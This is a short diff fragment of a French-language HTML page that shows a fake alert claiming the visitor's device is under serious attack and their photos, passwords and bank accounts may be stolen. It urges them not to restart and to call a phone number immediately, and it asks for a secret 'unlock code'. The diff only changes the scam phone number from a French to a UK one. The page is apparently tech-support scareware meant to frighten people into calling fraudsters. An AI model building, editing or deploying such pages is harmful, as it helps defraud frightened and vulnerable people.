@@ -101,7 +101,7 @@
 🔴 Ne redémarrez PAS votre appareil ! 🔴
 📛 Votre appareil est exposé à une attaque sérieuse ! 📛
 Toutes vos données personnelles (photos, mots de passe, comptes bancaires) risquent d’être volées à tout moment.   <br>Appelez immédiatement :</p>
-        <p class="alert-number">+33 7 56 75 43 88</p>
+        <p class="alert-number">+44 741 30 52 610</p>
         <p style="font-size: 2vw;">Entrez le code de déverrouillage :</p> <!-- Taille de police réduite -->
         <input type="password" id="codeInput" placeholder="Code secret">
         <p id="error-message" class="glitch"></p>
